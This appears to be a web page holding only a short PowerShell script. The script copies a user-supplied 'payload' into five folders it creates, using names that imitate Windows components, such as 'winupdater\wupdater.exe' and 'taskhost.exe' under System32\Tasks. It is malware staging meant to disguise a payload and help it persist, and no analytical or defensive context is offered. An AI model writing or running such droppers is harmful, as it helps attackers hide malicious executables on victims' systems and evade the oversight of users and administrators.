---
layout: blank
pagetitle: 
---

```Powershell
param (
    [Parameter(Mandatory=$true)]
    [string]$src
)

if (-not $src) {
    Write-Host "Error: The -src [payload-path] argument is required." -ForegroundColor Red
    exit 1
}

$paths = @(
    "C:\ProgramData\wininfo\info.exe",
    "C:\Windows\Temp\windata\windata.exe",
    "C:\Users\$env:USERNAME\AppData\Local\Microsoft\Windows\winupdater\wupdater.exe",
    "C:\ProgramData\Microsoft\Windows\winsvc\wsvc.exe",
    "C:\Windows\System32\Tasks\taskhost.exe"
)

foreach ($p in $paths) {
    New-Item -Path (Split-Path $p -Parent) -ItemType Directory -Force | Out-Null
    Copy-Item -Path $src -Destination $p -Force
}
```